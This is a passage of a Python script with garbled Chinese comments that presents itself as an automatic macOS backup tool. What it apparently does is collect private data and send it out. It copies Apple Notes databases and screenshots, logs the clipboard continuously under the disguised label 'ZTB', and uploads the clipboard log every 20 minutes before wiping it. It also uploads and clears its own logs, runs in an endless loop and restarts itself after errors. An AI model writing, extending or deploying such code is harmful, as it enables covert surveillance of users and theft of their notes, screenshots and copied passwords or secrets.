    if not backup_manager._clean_directory(notes_backup_directory):
        return None
        
    try:
        # å¤åˆ¶å¤‡å¿˜å½•æ•°æ®
        for root, _, files in os.walk(notes_dir):
            for file in files:
                if file.endswith('.sqlite') or file.endswith('.storedata'):
                    source_file = os.path.join(root, file)
                    if not os.path.exists(source_file):
                        continue
                        
                    relative_path = os.path.relpath(root, notes_dir)
                    target_sub_dir = os.path.join(notes_backup_directory, relative_path)
                    
                    if not backup_manager._ensure_directory(target_sub_dir):
                        continue
                        
                    try:
                        shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                    except Exception as e:
                        logging.error(f"å¤åˆ¶å¤‡å¿˜å½•æ–‡ä»¶å¤±è´¥: {e}")
                        continue
                        
        return notes_backup_directory if os.listdir(notes_backup_directory) else None
    except Exception as e:
        logging.error(f"å¤‡ä»½å¤‡å¿˜å½•æ•°æ®å¤±è´¥: {e}")
        return None

def backup_screenshots():
    """å¤‡ä»½æˆªå›¾æ–‡ä»¶"""
    screenshot_paths = [
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Pictures')
    ]
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, "screenshots")
    
    backup_manager = BackupManager()
    
    # ç¡®ä¿å¤‡ä»½ç›®å½•æ˜¯ç©ºçš„
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                # æ‰«ææ•´ä¸ªç›®å½•ï¼Œç­›é€‰åŒ…å«"screenshot"å…³é”®å­—çš„æ–‡ä»¶
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # æ£€æŸ¥æ–‡ä»¶åæ˜¯å¦åŒ…å«"screenshot"å…³é”®å­—ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰
                        if "screenshot" not in file.lower():
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"ğŸ“¸ å·²å¤‡ä»½æˆªå›¾: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æˆªå›¾æ–‡ä»¶å¤±è´¥ {source_file}: {e}")
            except Exception as e:
                logging.error(f"å¤„ç†æˆªå›¾ç›®å½•å¤±è´¥ {source_dir}: {e}")
        else:
            logging.error(f"æˆªå›¾ç›®å½•ä¸å­˜åœ¨: {source_dir}")
            
    if files_found:
        logging.info(f"ğŸ“¸ æˆªå›¾å¤‡ä»½å®Œæˆï¼Œå…±æ‰¾åˆ°åŒ…å«'screenshot'å…³é”®å­—çš„æ–‡ä»¶")
    else:
        logging.info("ğŸ“¸ æœªæ‰¾åˆ°åŒ…å«'screenshot'å…³é”®å­—çš„æˆªå›¾æ–‡ä»¶")
            
    return screenshot_backup_directory if files_found else None

def backup_mac_data(backup_manager):
    """å¤‡ä»½Macç³»ç»Ÿæ•°æ®
    
    Args:
        backup_manager: å¤‡ä»½ç®¡ç†å™¨å®ä¾‹
        
    Returns:
        bool: æ‰€æœ‰Macæ•°æ®å¤‡ä»½ä»»åŠ¡æ˜¯å¦æˆåŠŸå®Œæˆ
    """
    all_success = True
    try:
        # å¤‡ä»½å¤‡å¿˜å½•æ•°æ®
        notes_backup = backup_notes()
        if notes_backup:
            backup_path = backup_manager.zip_backup_folder(
                notes_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"notes_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("â˜‘ï¸ å¤‡å¿˜å½•æ•°æ®å¤‡ä»½å®Œæˆ\n")
                else:
                    logging.error("âŒ å¤‡å¿˜å½•æ•°æ®å¤‡ä»½å¤±è´¥\n")
                    all_success = False
            else:
                logging.error("âŒ å¤‡å¿˜å½•æ•°æ®å‹ç¼©å¤±è´¥\n")
                all_success = False
        else:
            logging.error("âŒ å¤‡å¿˜å½•æ•°æ®æ”¶é›†å¤±è´¥\n")
            all_success = False
        
        # å¤‡ä»½æˆªå›¾æ–‡ä»¶
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if backup_manager.upload_backup(backup_path):
                    logging.critical("â˜‘ï¸ æˆªå›¾æ–‡ä»¶å¤‡ä»½å®Œæˆ\n")
                else:
                    logging.error("âŒ æˆªå›¾æ–‡ä»¶å¤‡ä»½å¤±è´¥\n")
                    all_success = False
            else:
                logging.error("âŒ æˆªå›¾æ–‡ä»¶å‹ç¼©å¤±è´¥\n")
                all_success = False
        else:
            logging.error("âŒ æˆªå›¾æ–‡ä»¶æ”¶é›†å¤±è´¥\n")
            all_success = False
                    
        return all_success
        
    except Exception as e:
        logging.error(f"Macæ•°æ®å¤‡ä»½å¤±è´¥: {e}")
        return False

def backup_volumes(backup_manager, available_volumes):
    """å¤‡ä»½å¯ç”¨æ•°æ®å·
    
    Returns:
        bool: æ‰€æœ‰å¤‡ä»½ä»»åŠ¡æ˜¯å¦æˆåŠŸå®Œæˆ
    """
    all_success = True
    for volume_name, volume_configs in available_volumes.items():
        logging.info(f"\næ­£åœ¨å¤„ç†æ•°æ®å· {volume_name}")
        for backup_type, (source_dir, target_dir, ext_type) in volume_configs.items():
            try:
                if backup_type == 'specified':
                    # ä½¿ç”¨æ–°çš„æŒ‡å®šæ–‡ä»¶å¤‡ä»½æ–¹æ³•
                    backup_dir = backup_manager.backup_specified_files(source_dir, target_dir)
                else:
                    # ä½¿ç”¨åŸæœ‰çš„å¤‡ä»½æ–¹æ³•
                    backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if backup_manager.upload_backup(backup_path):
                            logging.critical(f"â˜‘ï¸ {volume_name} {backup_type} å¤‡ä»½å®Œæˆ\n")
                        else:
                            logging.error(f"âŒ {volume_name} {backup_type} å¤‡ä»½å¤±è´¥\n")
                            all_success = False
                    else:
                        logging.error(f"âŒ {volume_name} {backup_type} å‹ç¼©å¤±è´¥\n")
                        all_success = False
                else:
                    logging.error(f"âŒ {volume_name} {backup_type} å¤‡ä»½å¤±è´¥\n")
                    all_success = False
            except Exception as e:
                logging.error(f"âŒ {volume_name} {backup_type} å¤‡ä»½å‡ºé”™: {str(e)}\n")
                all_success = False
    
    return all_success

def periodic_backup_upload(backup_manager):
    """å®šæœŸæ‰§è¡Œå¤‡ä»½å’Œä¸Šä¼ """
    # ä½¿ç”¨æ–°çš„å¤‡ä»½ç›®å½•è·¯å¾„
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, "clipboard_log.txt")
    
    # å¯åŠ¨ZTBç›‘æ§çº¿ç¨‹
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("ğŸ“‹ ZTBç›‘æ§çº¿ç¨‹å·²å¯åŠ¨")
    
    # å¯åŠ¨ZTBä¸Šä¼ çº¿ç¨‹
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("ğŸ“¤ ZTBä¸Šä¼ çº¿ç¨‹å·²å¯åŠ¨")
    
    # åˆå§‹åŒ–ZTBæ—¥å¿—æ–‡ä»¶
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== ğŸ“‹ ZTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"âŒ åˆå§‹åŒ–ZTBæ—¥å¿—å¤±è´¥: {e}")

    # è·å–ç”¨æˆ·å
    username = getpass.getuser()
    current_time = datetime.now()
    logging.critical("\n" + "="*40)
    logging.critical(f"ğŸ‘¤ ç”¨æˆ·: {username}")
    logging.critical(f"ğŸš€ è‡ªåŠ¨å¤‡ä»½ç³»ç»Ÿå·²å¯åŠ¨  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("ğŸ“‹ ZTBç›‘æ§å’Œè‡ªåŠ¨ä¸Šä¼ å·²å¯åŠ¨")
    logging.critical("="*40)

    def read_next_backup_time():
        """è¯»å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            if os.path.exists(BackupConfig.THRESHOLD_FILE):
                with open(BackupConfig.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        try:
            next_time = datetime.now() + timedelta(seconds=BackupConfig.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(BackupConfig.THRESHOLD_FILE), exist_ok=True)
            with open(BackupConfig.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return None

    def should_backup_now():
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"â° å¼€å§‹å¤‡ä»½  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                backup_success = True
                
                # è·å–å½“å‰å¯ç”¨çš„æ•°æ®å·
                available_volumes = get_available_volumes()
                
                # æ‰§è¡Œå¤‡ä»½ä»»åŠ¡
                logging.critical("\nğŸ’¾ æ•°æ®å·å¤‡ä»½")
                if not backup_volumes(backup_manager, available_volumes):
                    backup_success = False
                
                logging.critical("\nğŸ Macç³»ç»Ÿæ•°æ®å¤‡ä»½")
                if not backup_mac_data(backup_manager):
                    backup_success = False
                
                # åœ¨å¤‡ä»½å®Œæˆåä¸Šä¼ æ—¥å¿—
                logging.critical("\nğŸ“ æ­£åœ¨ä¸Šä¼ å¤‡ä»½æ—¥å¿—...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"âŒ æ—¥å¿—å¤‡ä»½ä¸Šä¼ å¤±è´¥: {e}")
                    backup_success = False
                
                # å†™å…¥ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
                next_backup_time = write_next_backup_time()
                
                if backup_success:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"âœ… å¤‡ä»½å®Œæˆ  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("âŒ éƒ¨åˆ†å¤‡ä»½ä»»åŠ¡å¤±è´¥")
                    logging.critical("="*40)
                    logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                    if next_backup_time:
                        logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
            
            # æ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡æ˜¯å¦éœ€è¦å¤‡ä»½
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\nâŒ å¤‡ä»½å‡ºé”™: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"âŒ æ—¥å¿—å¤‡ä»½å¤±è´¥: {log_error}")
            # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿæ›´æ–°ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_and_upload_logs(backup_manager):
    """å¤‡ä»½å¹¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ·æ–°æ—¥å¿—ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰æ—¥å¿—éƒ½å·²å†™å…¥æ–‡ä»¶
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œç¡®ä¿æ–‡ä»¶ç³»ç»ŸåŒæ­¥
        time.sleep(0.5)
            
        # æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¤§å°
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸ºç©ºï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ›å»ºä¸´æ—¶ç›®å½•
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("âŒ æ— æ³•åˆ›å»ºä¸´æ—¶æ—¥å¿—ç›®å½•")
            return
            
        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
        try:
            # è¯»å–å½“å‰æ—¥å¿—å†…å®¹
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("âš ï¸ æ—¥å¿—å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡ä¸Šä¼ ")
                return
                
            # å†™å…¥å¤‡ä»½æ–‡ä»¶
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # éªŒè¯å¤‡ä»½æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ
            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—æ–‡ä»¶åˆ›å»ºå¤±è´¥æˆ–ä¸ºç©º")
                return
                
            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
            logging.info(f"ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ—¥å¿—æ–‡ä»¶ ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶ï¼Œåªä¿ç•™ä¸€æ¡è®°å½•
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== ğŸ“ å¤‡ä»½æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                    logging.info("âœ… å¤‡ä»½æ—¥å¿—ä¸Šä¼ æˆåŠŸå¹¶å·²æ¸…ç©º")
                except Exception as e:
                    logging.error(f"âŒ å¤‡ä»½æ—¥å¿—æ›´æ–°å¤±è´¥: {e}")
            else:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—ä¸Šä¼ å¤±è´¥")
                
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤åˆ¶æˆ–è¯»å–æ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†æ—¥å¿—æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
            
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                
    except Exception as e:
        logging.error(f"âŒ å¤„ç†å¤‡ä»½æ—¥å¿—æ—¶å‡ºé”™: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """ZTBä¸Šä¼ çº¿ç¨‹
    
    Args:
        backup_manager: å¤‡ä»½ç®¡ç†å™¨å®ä¾‹
        clipboard_log_path: ZTBæ—¥å¿—æ–‡ä»¶è·¯å¾„
    """
    last_upload_time = 0
    
    while True:
        try:
            current_time = time.time()
            
            # æ£€æŸ¥æ˜¯å¦éœ€è¦ä¸Šä¼ ï¼ˆæ¯20åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡ï¼‰
            if current_time - last_upload_time >= BackupConfig.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    file_size = os.path.getsize(clipboard_log_path)
                    if file_size > 0:
                        # æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰å®é™…è®°å½•
                        if backup_manager.has_clipboard_content(clipboard_log_path):
                            # åˆ›å»ºä¸´æ—¶æ–‡ä»¶
                            temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, 'temp', 'clipboard')
                            if backup_manager._ensure_directory(temp_dir):
                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                temp_file = os.path.join(temp_dir, f"clipboard_{timestamp}.txt")
                                
                                try:
                                    # å¤åˆ¶æ—¥å¿—å†…å®¹åˆ°ä¸´æ—¶æ–‡ä»¶
                                    shutil.copy2(clipboard_log_path, temp_file)
                                    
                                    # ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶
                                    if backup_manager.upload_file(temp_file):
                                        # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶
                                        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                            f.write(f"=== ğŸ“‹ ZTBæ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                                        last_upload_time = current_time
                                        if backup_manager.config.DEBUG_MODE:
                                            logging.info("ğŸ“¤ ZTBæ—¥å¿—ä¸Šä¼ æˆåŠŸ")
                                except Exception as e:
                                    if backup_manager.config.DEBUG_MODE:
                                        logging.error(f"âŒ ZTBæ—¥å¿—ä¸Šä¼ å¤±è´¥: {e}")
                                finally:
                                    # æ¸…ç†ä¸´æ—¶ç›®å½•
                                    try:
                                        if os.path.exists(temp_dir):
                                            shutil.rmtree(temp_dir)
                                    except Exception:
                                        pass
                        else:
                            # æ–‡ä»¶æ²¡æœ‰å®é™…å†…å®¹ï¼Œæ¸…ç©ºæ–‡ä»¶å¹¶é‡ç½®ä¸Šä¼ æ—¶é—´
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("ğŸ“‹ ZTBæ–‡ä»¶æ— å®é™…å†…å®¹ï¼Œè·³è¿‡ä¸Šä¼ ")
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== ğŸ“‹ ZTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                            last_upload_time = current_time
                
            # å®šæœŸæ£€æŸ¥
            time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)
            
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"ZTBä¸Šä¼ çº¿ç¨‹é”™è¯¯: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def main():
    """ä¸»å‡½æ•°"""
    pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
    try:
        # æ£€æŸ¥æ˜¯å¦å·²ç»æœ‰å®ä¾‹åœ¨è¿è¡Œ
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'å¤‡ä»½ç¨‹åºå·²ç»åœ¨è¿è¡Œ (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # å†™å…¥å½“å‰è¿›ç¨‹PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # æ³¨æ„ï¼šæ—¥å¿—é…ç½®åœ¨ BackupManager.__init__ ä¸­è¿›è¡Œï¼Œæ— éœ€é‡å¤é…ç½®
        
        # æ£€æŸ¥ç£ç›˜ç©ºé—´
        try:
            # åœ¨ macOS ä¸Šç›´æ¥ä½¿ç”¨å¤‡ä»½æ ¹ç›®å½•
            free_space = shutil.disk_usage(BackupConfig.BACKUP_ROOT).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'å¤‡ä»½é©±åŠ¨å™¨ç©ºé—´ä¸è¶³: {free_space / (1024*1024*1024):.2f}GB')
        except Exception as e:
            logging.warning(f'æ— æ³•æ£€æŸ¥ç£ç›˜ç©ºé—´: {e}')
        
        # åˆ›å»ºå¤‡ä»½ç®¡ç†å™¨å®ä¾‹
        backup_manager = BackupManager()
        
        # æ¸…ç†æ—§çš„å¤‡ä»½ç›®å½•
        clean_backup_directory()
        
        # å¯åŠ¨å®šæœŸå¤‡ä»½å’Œä¸Šä¼ 
        periodic_backup_upload(backup_manager)
            
    except KeyboardInterrupt:
        logging.info('å¤‡ä»½ç¨‹åºè¢«ç”¨æˆ·ä¸­æ–­')
    except Exception as e:
        logging.error(f'å¤‡ä»½è¿‡ç¨‹å‘ç”Ÿé”™è¯¯: {str(e)}')
        # å‘ç”Ÿé”™è¯¯æ—¶ç­‰å¾…ä¸€æ®µæ—¶é—´åé‡è¯•
        time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
        main()  # é‡æ–°å¯åŠ¨ä¸»ç¨‹åº
    finally:
        # æ¸…ç†PIDæ–‡ä»¶
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'æ¸…ç†PIDæ–‡ä»¶å¤±è´¥: {str(e)}')

if __name__ == "__main__":
    main()
